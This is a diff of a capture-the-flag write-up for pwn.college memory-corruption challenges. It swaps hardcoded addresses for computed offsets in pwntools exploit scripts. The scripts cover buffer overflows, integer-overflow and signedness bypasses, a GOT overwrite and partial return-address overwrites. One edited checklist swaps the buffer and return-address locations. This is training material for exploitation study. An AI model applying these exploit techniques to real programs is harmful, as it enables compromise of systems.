@@ -1490,7 +1490,12 @@ overwriting the return address, and the program would abort.
 Payload size: 
 ```
 
-Let's open the program within GDB.
+Let's open the program within GDB and find the offset.
+
+```
+pwndbg> p/d 0x7ffe0cc90196 - 0x7ffe0cc8fa40
+$1 = 1878
+```
 
 ```
 pwndbg> info functions
@@ -1528,7 +1533,9 @@ Non-debugging symbols:
 0x00000000000022a8  _fini
 ```
 
-### `challenge()`
+### Binary Analysis
+
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -1899,13 +1906,10 @@ from pwn import *
 p = process('/challenge/login-leakage-easy')
 
 # Initialize values
-buffer_addr = 0x7ffccd0bfbe0
-password_addr = 0x7ffccd0c0336
-addr_of_saved_bp = 0x7ffe2e4a66a0
 password = 0xdeadbeeffacade00
+offset = 1878
 
-# Calculate offset & payload_size
-offset = password_addr - buffer_addr
+# Calculate payload_size
 payload_size = offset + 8
 
 # Build payload
@@ -1967,8 +1971,7 @@ In this challenge we do not get any information from running the program.
 
 Requirements to craft an exploit:
 
-* [ ] Location of buffer
-* [ ] Location of password
+- [ ] Offset between buffer address and address of the password
 
 ```
 pwndbg> info functions
@@ -2005,7 +2008,9 @@ Non-debugging symbols:
 pwndbg> 
 ```
 
-### `challenge()`
+### Binary Analysis
+
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -2163,8 +2168,16 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-* [x] Location of buffer: `0x7ffd75790bf0`
-* [x] Location of password: `0x7ffd75791218`
+```
+pwndbg> p/d 0x7ffd75791218 - 0x7ffd75790bf0
+$1 = 1576
+```
+
+- [x] Offset between buffer address and address of the password
+   - Location of buffer: `0x7ffd75790bf0`
+   - Location of password: `0x7ffd75791218`
+
+### Exploit
 
 ```py title="~/script.py" showLineNumbers
 from pwn import *
@@ -2172,13 +2185,10 @@ from pwn import *
 p = process('/challenge/login-leakage-hard')
 
 # Initialize values
-buffer_addr = 0x7ffd75790bf0
-password_addr = 0x7ffd75791218
-# addr_of_saved_bp = 0x7ffe2e4a66a0
 password = 0xdeadbeeffacade00
+offset = 1576
 
-# Calculate offset & payload_size
-offset = password_addr - buffer_addr
+# Calculate payload_size
 payload_size = offset + 8
 
 # Build payload
@@ -2424,9 +2434,18 @@ Provided size is too large!
 
 This challenge checks if the payload size entered by the user overflows the length of the buffer. If yes, it exits early without reading the payload.
 
-It does hint somehting about using a two's complement but we'll se when we get there.
+It does hint something about using a two's complement but we'll se when we get there.
 
-### `challenge()`
+### Binary Analysis
+
+Let's first calculate the offset between the buffer and the stored return address
+
+```
+pwndbg> p/d 0x7ffcae8fa408 - 0x7ffcae8fa380
+$1 = 136
+```
+
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -2481,7 +2500,7 @@ ssize_t read(int fd, void buf[.count], size_t count);
 
 This is where the hint comes into play.
 
-### [Two's compliment](https://en.wikipedia.org/wiki/Two%27s_complement)
+#### [Two's compliment](https://en.wikipedia.org/wiki/Two%27s_complement)
 
 It is additive inverse operation, so negative numbers are represented by the two's complement of the absolute value. Let's look at an example.
 
@@ -2548,7 +2567,7 @@ Out[1]: 18446744073709551615
 
 As a result of this mismatch between how `jle` and `read@plt` interpret our payload size input, we are able to pass the check, and overflow the buffer.
 
-### `win()`
+#### `win()`
 
 ```
 hacker@program-security~bounds-breaker-easy:~$ objdump --disassemble=win -M intel /challenge/bounds-breaker-easy 
@@ -2639,12 +2658,10 @@ from pwn import *
 p = process('/challenge/bounds-breaker-easy')
 
 # Initialize values
-buffer_addr = 0x7ffcae8fa380
-addr_of_stored_ip = 0x7ffcae8fa408
+offset = 136
 win_func_addr = 0x4020f3
 
-# Calculate offset & payload_size
-offset = addr_of_stored_ip - buffer_addr
+# Calculate payload_size
 payload_size = -1
 
 # Build payload
@@ -2738,8 +2755,7 @@ Goodbye!
 ### Goodbye!
 ```
 
-* [ ] Location of buffer
-* [ ] Location of stored return address to `main()`
+* [ ] Offset between location of buffer and location of the stored return address to `main()`
 * [ ] Location of `win()`
 
 ### `challenge()`
@@ -2890,10 +2906,6 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-* [x] Location of buffer: `0x7ffc2db73b70`
-* [ ] Location of stored return address to `main()`
-* [ ] Location of `win()`
-
 ```
 pwndbg> info frame
 Stack level 0, frame at 0x7ffc2db73bf0:
@@ -2905,8 +2917,14 @@ Stack level 0, frame at 0x7ffc2db73bf0:
   rbp at 0x7ffc2db73be0, rip at 0x7ffc2db73be8
 ```
 
-* [x] Location of buffer: `0x7ffc2db73b70`
-* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
+```
+pwndbg> p/d 0x7ffc2db73be8 - 0x7ffc2db73b70
+$1 = 120
+```
+
+* [x] Offset between location of buffer and location of the stored return address to `main()`: `120`
+   - Location of buffer: `0x7ffc2db73b70`
+   - Location of stored return address to `main()`: `0x7ffc2db73be8`
 * [ ] Location of `win()`
 
 ```
@@ -2914,8 +2932,9 @@ pwndbg> info address win
 Symbol "win" is at 0x4020ae in a file compiled without debugging.
 ```
 
-* [x] Location of buffer: `0x7ffc2db73b70`
-* [x] Location of stored return address to `main()`: `0x7ffc2db73be8`
+* [x] Offset between location of buffer and location of the stored return address to `main()`: `120`
+   - Location of buffer: `0x7ffc2db73b70`
+   - Location of stored return address to `main()`: `0x7ffc2db73be8`
 * [x] Location of `win()`: `0x4020ae`
 
 ### Exploit
@@ -2926,12 +2945,10 @@ from pwn import *
 p = process('/challenge/bounds-breaker-hard')
 
 # Initialize values
-buffer_addr = 0x7ffc2db73b70
-addr_of_stored_ip = 0x7ffc2db73be8
+offset = 120
 win_func_addr = 0x4020ae
 
-# Calculate offset & payload_size
-offset = addr_of_stored_ip - buffer_addr
+# Calculate payload_size
 payload_size = -1
 
 # Build payload
@@ -3043,9 +3060,16 @@ Aborted
 
 This program accepts the `record_size` and `record_num` from the user, and if the multiplication result is greater that `98` which is the buffer size, it exits.
 
-Let's see how this check is performed.
+### Binary Analysis
 
-### `challenge()`
+```
+pwndbg> p/d 0x7ffc784427b8 - 0x7ffc78442730
+$1 = 136
+```
+
+#### `challenge()`
+
+Let's see how this check is performed.
 
 ```
 pwndbg> disassemble challenge
@@ -3095,7 +3119,7 @@ Moving ahead, if the result of the multiplication greater than `0x62`, the progr
 
 However, the vulnerability here is an [Integer Overflow](https://en.wikipedia.org/wiki/Integer_overflow). The instruction `imul eax, edx` performs 32-bit multiplication. If the result is larger than what 32 bits can hold, the "extra" bits are simply discarded (truncated), and only the lower 32 bits remain in `eax` for the `cmp` instruction.
 
-### Integer overflow
+#### Integer overflow
 
 We need to provide two numbers whose mathematical product is very large, but when truncated to 32 bits, the result is between `0` and `0x62` (98 in decimal).
 
@@ -3121,7 +3145,7 @@ As we can see, even if the result is a huge number ($4,294,967,296$), the value 
 
 Before we craft our exploit, we need the address of `win()`.
 
-### `win()`
+#### `win()`
 
 ```
 pwndbg> info address win
@@ -3136,12 +3160,10 @@ from pwn import *
 p = process('/challenge/casting-catastrophe-easy')
 
 # Initialize values
-buffer_addr = 0x7ffcf11c6c80
-addr_of_stored_ip = 0x7ffcf11c6d08
+offset = 136
 win_func_addr = 0x4022d7
 
 # Calculate offset & payload_size
-offset = addr_of_stored_ip - buffer_addr
 records_num = 65536
 records_size = 65536
 
@@ -3243,11 +3265,12 @@ Goodbye!
 ### Goodbye!
 ```
 
-* [ ] Location of buffer
-* [ ] Location of stored return address to `main()`
+* [ ] Offset between location of buffer and location of the stored return address to `main()`
 * [ ] Location of `win()`
 
-### `challenge()`
+### Binary Analysis
+
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -3289,10 +3312,6 @@ End of assembler dump.
 ```
 
 This challenge makes the same mistake of multiplying two 32-bit registers, and the comparing only the part of the result stored in `eax`.
-
-* [ ] Location of buffer
-* [ ] Location of stored return address to `main()`
-* [ ] Location of `win()`
 
 Let's set a breakpoit right before the call to `read@plt`.
 
@@ -3382,10 +3401,6 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-* [x] Location of buffer: `0x7ffec1695f10`
-* [ ] Location of stored return address to `main()`
-* [ ] Location of `win()`
-
 ```
 pwndbg> info frame
 Stack level 0, frame at 0x7ffec1695f60:
@@ -3397,8 +3412,14 @@ Stack level 0, frame at 0x7ffec1695f60:
   rbp at 0x7ffec1695f50, rip at 0x7ffec1695f58
 ```
 
-* [x] Location of buffer: `0x7ffec1695f10`
-* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
+```
+pwndbg> p/d 0x7ffec1695f58 - 0x7ffec1695f10
+$1 = 72
+```
+
+* [x] Offset between location of buffer and location of the stored return address to `main()`: `72`
+   - Location of buffer: `0x7ffec1695f58`
+   - Location of stored return address to `main()`: `0x7ffec1695f10`
 * [ ] Location of `win()`
 
 ```
@@ -3406,8 +3427,9 @@ pwndbg> info address win
 Symbol "win" is at 0x4014e9 in a file compiled without debugging.
 ```
 
-* [x] Location of buffer: `0x7ffec1695f10`
-* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
+* [x] Offset between location of buffer and location of the stored return address to `main()`: `72`
+   - Location of buffer: `0x7ffec1695f58`
+   - Location of stored return address to `main()`: `0x7ffec1695f10`
 * [x] Location of `win()`: `0x4014e9`
 
 ### Exploit
@@ -3418,12 +3440,10 @@ from pwn import *
 p = process('/challenge/casting-catastrophe-hard')
 
 # Initialize values
-buffer_addr = 0x7ffec1695f10
-addr_of_stored_ip = 0x7ffec1695f58
+offset = 72
 win_func_addr = 0x4014e9
 
-# Calculate offset & payload_size
-offset = addr_of_stored_ip - buffer_addr
+# Calculate payload_size
 records_num = 65536
 records_size = 65536
 
@@ -3561,6 +3581,13 @@ Goodbye!
 This challenge prints whatever string is pointed to by the `char*` pointer.
 So in order to solve this challenge, we just need to overflow the buffer, and overwrite the `char*` pointer with the address of the flag.
 
+Let's find the offset between the buffer and the `char*` pointer.
+
+```
+pwndbg> p/d 0x7ffe3b8a8608 - 0x7ffe3b8a85c0
+$1 = 72
+```
+
 ### Exploit
 
 ```py title="~/script.py" showLineNumbers
@@ -3571,22 +3598,12 @@ p = process('/challenge/pointer-problems-easy')
 
 output = p.recvuntil(b'Payload size:')
 
-# input buffer base
-buffer_addr = int(re.search(rb'input buffer begins at (0x[0-9a-fA-F]+)', output).group(1), 16)
-# the target char* pointer on stack
-char_ptr_addr = int(re.search(rb'The char\* is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
-# the flag's address in the bss
+# Initialize values
 flag_addr = int(re.search(rb'The flag\s+is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
+offset = 72
 
-# Calculate offset & payload_size
-offset = char_ptr_addr - buffer_addr
+# Calculate payload_size
 payload_size = offset + 8
-
-# Log info
-log.success(f"Input Buffer     @ {hex(buffer_addr)}")
-log.success(f"Pointer          @ {hex(char_ptr_addr)}")
-log.success(f"Flag Addr        @ {hex(flag_addr)}")
-log.success(f"Offset:            {offset} bytes")
 
 # Build payload
 payload = b"A" * offset
@@ -3604,11 +3621,6 @@ p.interactive()
 
 ```
 hacker@program-security~pointer-problems-easy:~$ python ~/script.py 
-[+] Starting local process '/challenge/pointer-problems-easy': pid 10061
-[+] Input Buffer     @ 0x7fff3881eef0
-[+] Pointer          @ 0x7fff3881ef38
-[+] Flag Addr        @ 0x60eb05b09060
-[+] Offset:        72 bytes
 /home/hacker/script.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
   p.sendline(str(payload_size))
 [*] Switching to interactive mode
@@ -3667,8 +3679,7 @@ Payload size:
 ```
 
 We need the following:
-- [ ] Location of buffer
-- [ ] Location of `char*` to array
+- [ ] Offset between location of buffer and location of `char*` to array
 - [ ] Offset of the flag
 
 ### Binary Analysis
@@ -3812,8 +3823,7 @@ We can see that the flag is read at an offset of `0x5040` which falls in the `.b
 # ---- snip ----
 ```
 
-- [ ] Location of buffer
-- [ ] Location of `char*` to array
+- [ ] Offset between location of buffer and location of `char*` to array
 - [x] Offset of the flag: `0x5040`
 
 There is a `read@plt` happening at `challenge+347`.
@@ -3889,8 +3899,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [x] Location of buffer: `0x7ffec3de8700`
-- [ ] Location of `char*` to array
+- [ ] Offset between location of buffer and location of `char*` to array
+   - Location of buffer: `0x7ffec3de8700`
 - [x] Offset of the flag: `0x5040`
 
 There is a call to `printf@plt` made at `challenge+430`.
@@ -3971,10 +3981,20 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [x] Location of buffer: `0x7ffec3de8700`
-- [x] Location of `char*` to array: `0x7ffec3de8780`
+- [ ] Offset between location of buffer and location of `char*` to array
+   - Location of buffer: `0x7ffec3de8700`
+   - Location of `char*` to array: `0x7ffec3de8780`
 - [x] Offset of the flag: `0x5040`
 
+```
+pwndbg> p/d 0x7ffec3de8780 - 0x7ffec3de8700
+$1 = 128
+```
+
+- [x] Offset between location of buffer and location of `char*` to array: `128`
+   - Location of buffer: `0x7ffec3de8700`
+   - Location of `char*` to array: `0x7ffec3de8780`
+- [x] Offset of the flag: `0x5040`
 
 ### Exploit
 
@@ -3989,15 +4009,11 @@ while True:
 
     output = p.recvuntil(b'Payload size:')
 
-    # input buffer base
-    buffer_addr = 0x7ffec3de8700
-    # the target char* pointer on stack
-    char_ptr_addr = 0x7ffec3de8780
-    # the flag's address in the bss
+    # Initialize values
+    offset = 128
     flag_offset = 0x5040
 
-    # Calculate offset & payload_size
-    offset = char_ptr_addr - buffer_addr
+    # Calculate payload_size
     payload_size = offset + 2
 
     # Build payload
@@ -4137,6 +4153,13 @@ b'pwn.coll'
 
 So our logic is working, but we will have to brute force 8 bytes of the flag at a time.
 
+Let' find the offset between the location of the flag and the location of the array.
+
+```
+pwndbg> p/d 0x7ffc61dcdd50 - 0x7ffc61dcecc8
+$1 = -3960
+```
+
 ### Exploit
 
 ```py title="~/script" showLineNumbers
@@ -4144,12 +4167,11 @@ from pwn import *
 import re
 
 # Setup addresses
-array_addr = 0x7ffc61dcecc8
-flag_addr  = 0x7ffc61dcdd50
+offset = -3960
 chunk_size = 8
 
 # Calculate starting point
-base_index = (flag_addr - array_addr) // chunk_size
+base_index = offset // chunk_size
 
 flag = ""
 current_index = base_index
@@ -4212,10 +4234,10 @@ Goodbye!
 
 In order to solve this challenge, we need the following things:
 
-* [ ] Location of flag
-* [ ] Location of array
+- [ ] Offset between the location of the flag and the location of the array
 
-### `challenge()`
+### Binary Analysis
+#### `challenge()`
 
 ```
 pwndbg> disassemble challenge
@@ -4456,8 +4478,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 
 So we have the location where is flag is stored in memory. 
 
-* [x] Location of flag: `0x7ffe79e96110`
-* [ ] Location of array
+- [ ] Offset between the location of the flag and the location of the array
+   - Location of flag: `0x7ffe79e96110`
 
 Later in the assembly, we can see that the program calls `scanf` to read the `index` from the user, performs some operations using that index, and then prints the data.
 
@@ -4554,8 +4576,16 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 
 If we look carefully at the `DISASM` section of teh output, we can see the `hacker_num` being moved into `rax`, and it's address.
 
-* [x] Location of flag: `0x7ffe79e96110`
-* [x] Location of array: `0x7ffe79e963b8`
+- [ ] Offset between the location of the flag and the location of the array
+   - Location of flag: `0x7ffe79e96110`
+   - Location of array: `0x7ffe79e963b8`
+
+Let's calculate the offset.
+
+```
+pwndbg> p/d 0x7ffe79e96110 - 0x7ffe79e963b8
+$1 = -680
+```
 
 ### Exploit
 
@@ -4563,13 +4593,12 @@ If we look carefully at the `DISASM` section of teh output, we can see the `hack
 from pwn import *
 import re
 
-# Setup addresses
-array_addr = 0x7ffe79e963b8
-flag_addr  = 0x7ffe79e96110
+# Initialize values
+offset = -680
 chunk_size = 8
 
 # Calculate starting point
-base_index = (flag_addr - array_addr) // chunk_size
+base_index = offset // chunk_size
 
 flag = ""
 current_index = base_index
@@ -4578,7 +4607,7 @@ print("[*] Starting dynamic leak...")
 
 while "}" not in flag:
     # Start fresh process for each 8-byte read
-    p = process('/challenge/anomalous-array-easy', level='error') 
+    p = process('/challenge/anomalous-array-hard', level='error') 
     
     p.sendlineafter(b"Which number would you like to view?", str(current_index).encode())
     output = p.recvall().decode(errors="ignore")
@@ -5044,8 +5073,8 @@ Goodbye!
 
 We need the following in order to craft an exploit.
 
-- [ ] Location of the GOT entry for `puts`
-- [ ] Location of the array
+
+- [ ] Offset between the location of the GOT entry for `puts` and the location of the array
 
 ```
 hacker@program-security~now-you-got-it-hard:~$ checksec /challenge/now-you-got-it-hard 
@@ -5220,8 +5249,8 @@ GOT protection: Partial RELRO | Found 12 GOT entries passing the filter
 [0x61547e762070] strerror@GLIBC_2.2.5 -> 0x61547e75e0e0 ◂— endbr64 
 ```
 
-- [x] Location of the GOT entry for `puts`: `0x61547e762020`
-- [ ] Location of the array
+- [ ] Offset between the location of the GOT entry for `puts` and the location of the array
+   - Location of the GOT entry for `puts`: `0x61547e762020`
 
 Now, let's set a breakpoint at `challenge+695`, and get the address of the array.
 
@@ -5288,8 +5317,18 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [x] Location of the GOT entry for `puts`: `0x61547e762020`
-- [x] Location of the array: `0x61547e762e88`
+- [ ] Offset between the location of the GOT entry for `puts` and the location of the array
+   - Location of the GOT entry for `puts`: `0x61547e762020`
+   - Location of the array: `0x61547e762e88`
+
+```
+pwndbg> p/d 0x61547e762020 - 0x61547e762e88
+$1 = -3688
+```
+
+- [x] Offset between the location of the GOT entry for `puts` and the location of the array" `-3688`
+   - Location of the GOT entry for `puts`: `0x61547e762020`
+   - Location of the array: `0x61547e762e88`
 
 Finally, we have to see if `win()` call `puts@plt` before printing our flag, and skip that part of the code.
 
@@ -5359,8 +5398,9 @@ Dump of assembler code for function win:
 End of assembler dump.
 ```
 
-- [x] Location of the GOT entry for `puts`: `0x61547e762020`
-- [x] Location of the array: `0x61547e762e88`
+- [x] Offset between the location of the GOT entry for `puts` and the location of the array" `-3688`
+   - Location of the GOT entry for `puts`: `0x61547e762020`
+   - Location of the array: `0x61547e762e88`
 - [x] Offset inside `win()` which skips the `puts@plt` call before leaking flag: `20`
 
 ### Exploit
@@ -5369,11 +5409,9 @@ End of assembler dump.
 from pwn import *
 
 # Initialize values
-array_addr = 0x61547e762e88
-puts_got_addr = 0x61547e762020
+offset = -3688
 
-# Calculate offset and index
-offset = puts_got_addr - array_addr
+# Calculate index
 index = offset // 8
 
 p = process('/challenge/now-you-got-it-hard')
@@ -5395,6 +5433,8 @@ hacker@program-security~now-you-got-it-hard:~$ python ~/script.pyclear
 # ---- snip ----
 
 pwn.college{wS9b_4nt9UBct057CQ2Art0EafV.QX3gzN4EDL4ITM0EzW}
+
+# ---- snip ----
 ```
 
 &nbsp;
@@ -5487,9 +5527,33 @@ We have to keep providing a single byte of payload until we reach the address wh
 Then we have to overwrite the value of `n` with the distance between the buffer address and the saved return address.
 
 Before we craft the exploit, we need the following:
+- [ ] Offset between the buffer and stored return address to `main()`
+- [ ] Offset between the buffer and variable `n`
 - [ ] Offset of instruction within `win_authed()` which skips the authentication
 
 ### Binary Analysis
+
+Let's calculate the offsets real quick.
+
+```
+pwndbg> p/d 0x7fff073720b8 - 0x7fff07372080
+$1 = 56
+```
+
+- [x] Offset between the buffer and stored return address to `main()`: `56`
+- [ ] Offset between the buffer and variable `n`
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+```
+pwndbg> p/d 0x7fff07372098 - 0x7fff07372080
+$2 = 24
+```
+
+- [x] Offset between the buffer and stored return address to `main()`: `56`
+- [x] Offset between the buffer and variable `n`: `24`
+- [ ] Offset of instruction within `win_authed()` which skips the authentication
+
+#### `win_authed()`
 
 ```
 pwndbg> disass win_authed 
@@ -5511,6 +5575,8 @@ Dump of assembler code for function win_authed:
 End of assembler dump.
 ```
 
+- [x] Offset between the buffer and stored return address to `main()`: `56`
+- [x] Offset between the buffer and variable `n`: `24`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x164e`
 
 Intbhis exploit we have to partially overwrite the return address.
@@ -5538,6 +5604,7 @@ However, in the second LSB, one nibble would be constant, and the other would va
 If we overwrite the last two bytes of the return address, there is a chance that last two bytes will be the same as the offset of `win_authed()`.
 Some brute-forcing will be required in this challenge.
 
+
 ### Exploit
 
 ```py title="~/script.py" showLineNumbers
@@ -5556,15 +5623,12 @@ while True:
     # Optional: Uncomment the next line to see every byte exchanged
     # context.log_level = 'debug' 
 
-    buffer_addr = 0x7ffc4f918380
-    addr_of_saved_ip = 0x7ffc4f9183b8
-    var_n_addr = 0x7ffc4f918398
     win_authed_offset = 0x164e
+    ret_offset = 56
+    var_n_offset = 24
 
-    total_offset = addr_of_saved_ip - buffer_addr
-    var_n_offset = var_n_addr - buffer_addr
-    jump = total_offset - var_n_offset
-    payload_size = total_offset + 2
+    jump = ret_offset - var_n_offset
+    payload_size = ret_offset + 2
 
     print(f"[+] Attempt {attempt} | Target: {hex(target_bytes[1])}{hex(target_bytes[0])[2:]}")
 
@@ -5585,7 +5649,7 @@ while True:
         # 4. OVERWRITE 'n' to jump to Return Address (offset 56)
         # We send 55 because n += 1 happens after our write, making n=56
         p.recvuntil(b"24 bytes away", timeout=2)
-        p.send(p8(total_offset - 1)) 
+        p.send(p8(ret_offset - 1)) 
 
         # 5. OVERWRITE Return Address
         p.recvuntil(b"56 bytes away", timeout=2)
@@ -5701,13 +5765,11 @@ Goodbye!
 ```
 
 For exploiting this challenge, we need the followin:
-- [ ] Address of the buffer
-- [ ] Address of variable `n`
-- [ ] Location of stored return address to `main()`
+- [ ] Offset between the buffer and stored return address to `main()`
+- [ ] Offset between the buffer and variable `n`
 - [ ] Offset of instruction within `win_authed()` which skips the authentication
 
 ### Binary Analysis
-
 
 #### `win_authed()`
 
@@ -5733,9 +5795,8 @@ Dump of assembler code for function win_authed:
 End of assembler dump.
 ```
 
-- [ ] Address of the buffer
-- [ ] Address of variable `n`
-- [ ] Location of stored return address to `main()`
+- [ ] Offset between the buffer and stored return address to `main()`
+- [ ] Offset between the buffer and variable `n`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
 
 
@@ -5842,9 +5903,9 @@ We can see that the buffer is at `rbp-0x80` based on these instructions where th
 # ---- snip ----
 ```
 
-- [x] Address of the buffer: `rbp-0x80`
-- [ ] Address of variable `n`
-- [ ] Location of stored return address to `main()`
+- [ ] Offset between the buffer and stored return address to `main()`
+   - Address of the buffer: `rbp-0x80`
+- [ ] Offset between the buffer and variable `n`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
 
 Further in the program, there is this part:
@@ -5880,9 +5941,30 @@ Then for the `read@plt` call, it does the following:
 
 This tells us that the location of `n` is `rbp-0x80+0x6c` i.e. `rbp-0x14`.
 
-- [x] Address of the buffer:: `rbp-0x80`
-- [x] Address of variable `n`: `rbp-0x14`
-- [x] Location of stored return address to `main()`: `rbp-0x8`
+- [ ] Offset between the buffer and stored return address to `main()`
+   - Address of the buffer: `rbp-0x80`
+   - Location of stored return address to `main()`: `rbp+0x8`
+- [ ] Offset between the buffer and variable `n`
+   - Address of the buffer:: `rbp-0x80`
+   - Address of variable `n`: `rbp-0x14`
+- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
+
+```
+pwndbg> p/d 0x8 - (-0x80)
+$1 = 136
+```
+
+```
+pwndbg> p/d -0x14 - (-0x80)
+$2 = 108
+```
+
+- [x] Offset between the buffer and stored return address to `main()`: `136`
+   - Address of the buffer: `rbp-0x80`
+   - Location of stored return address to `main()`: `rbp+0x8`
+- [x] Offset between the buffer and variable `n`: `108`
+   - Address of the buffer:: `rbp-0x80`
+   - Address of variable `n`: `rbp-0x14`
 - [x] Offset of instruction within `win_authed()` which skips the authentication: `0x2128`
 
 ### Exploit
@@ -5900,19 +5982,11 @@ while True:
     # Update binary path to hard mode
     p = process('/challenge/loop-lunacy-hard')
     
-    # Updated hardcoded addresses from your prompt
-    buffer_addr = - 0x80      # rbp - 128
-    var_n_addr = - 0x14      # rbp - 20 (This is -0x80 + 0x6c)
-    addr_of_saved_ip = 0x8   # rbp + 8
-    
-    # Calculate distances
-    # Note: if var_n_addr < buffer_addr, the offset is negative!
-    # Python's p8() handles signed integers, but let's calculate carefully.
-    total_offset = addr_of_saved_ip - buffer_addr
-    var_n_offset = var_n_addr - buffer_addr
-    payload_size = total_offset + 2
+    ret_offset = 136
+    var_n_offset = 108
+    payload_size = ret_offset + 2
 
-    print(f"[+] Attempt {attempt} | Offsets: n={var_n_offset}, ret={total_offset}")
+    print(f"[+] Attempt {attempt} | Offsets: n={var_n_offset}, ret={ret_offset}")
 
     try:
         # 1. Provide size
@@ -5934,12 +6008,12 @@ while True:
         p.send(b"A" * var_n_offset)
 
         # 4. OVERWRITE 'n' to jump to Return Address
-        # We send the byte that makes the NEXT read happen at total_offset
-        p.send(p8(total_offset - 1)) 
+        # We send the byte that makes the NEXT read happen at ret_offset
+        p.send(p8(ret_offset - 1)) 
 
         # 5. OVERWRITE Return Address
         # Immediately send the target bytes. The program will read these
-        # as soon as it updates 'n' to the total_offset value.
+        # as soon as it updates 'n' to the ret_offset value.
         p.send(p8(target_bytes[0])) 
         p.send(p8(target_bytes[1])) 
 
@@ -6091,10 +6165,10 @@ The solution to this challenge is pretty easy.
 If we look at the addresses we have been provided with, we can see that the flag sits between the buffer and the stored return address. 
 
 ```py title"~/script.py" showLineNumbers
-buffer_addr = 0x7ffd7c4a00e0
-canary_addr = 0x7ffd7c4a0248
-ret_addr = 0x7ffd7c4a0258
-flag_addr = 0x7ffd7c4a0143
+buffer_addr = 0x7fffeec29490
+canary_addr = 0x7fffeec295f8
+ret_addr = 0x7fffeec29608
+flag_addr = 0x7fffeec294f3
 
 flag_dist = flag_addr - buffer_addr
 canary_dist = canary_addr - buffer_addr
@@ -6118,6 +6192,13 @@ This means, we do not have to overflow the buffer at all. Our payload just has t
 
 So, it will print out the flag as well for us.
 
+Let's calculate the offset.
+
+```
+pwndbg> p/d 0x7fffeec294f3 - 0x7fffeec29490
+$1 = 99
+```
+
 ### Exploit
 
 ```py title="~/script.py" showLineNumbers
@@ -6126,11 +6207,9 @@ from pwn import *
 p = process('/challenge/nosy-neighbor-easy')
 
 # Initialize values
-buffer_addr = 0x7ffd7c4a00e0
-flag_addr = 0x7ffd7c4a0143
+offset = 99
 
-# Calculate offset & payload_size
-offset = flag_addr - buffer_addr
+# Calculate payload_size
 payload_size = offset
 
 # Build payload
@@ -6191,8 +6270,7 @@ Goodbye!
 
 We will need the following for crafting an exploit:
 
-- [ ] Location of buffer
-- [ ] Location of flag
+- [ ] Offset between location of the buffer and location of the flag
 
 ### Binary Analysis
 
@@ -6391,8 +6469,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [ ] Location of buffer
-- [x] Location of flag: `0x7ffd4aea25dc`
+- [ ] Offset between location of the buffer and location of the flag
+   - Location of flag: `0x7ffd4aea25dc`
 
 ```
 pwndbg> c
@@ -6456,8 +6534,18 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [x] Location of buffer: `0x7ffd4aea2580`
-- [x] Location of flag: `0x7ffd4aea25dc`
+- [ ] Offset between location of the buffer and location of the flag
+   - Location of buffer: `0x7ffd4aea2580`
+   - Location of flag: `0x7ffd4aea25dc`
+
+```
+pwndbg> p/d 0x7ffd4aea25dc - 0x7ffd4aea2580
+$1 = 92
+```
+
+- [x] Offset between location of the buffer and location of the flag: `92`
+   - Location of buffer: `0x7ffd4aea2580`
+   - Location of flag: `0x7ffd4aea25dc`
 
 ### Exploit
 
@@ -6467,11 +6555,9 @@ from pwn import *
 p = process('/challenge/nosy-neighbor-hard')
 
 # Initialize values
-buffer_addr = 0x7ffd4aea2580
-flag_addr = 0x7ffd4aea25dc
+offset = 92
 
-# Calculate offset & payload_size
-offset = flag_addr - buffer_addr
+# Calculate payload_size
 payload_size = offset
 
 # Build payload
@@ -8223,8 +8309,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [ ] Location of buffer
-- [x] Location of the flag in the stack: `0x7ffe5dbd2e96`
+- [ ] Offset between location of the buffer and location of the flag
+   - Location of the flag in the stack: `0x7ffe5dbd2e96`
 
 ```
 pwndbg> c
@@ -8292,8 +8378,18 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
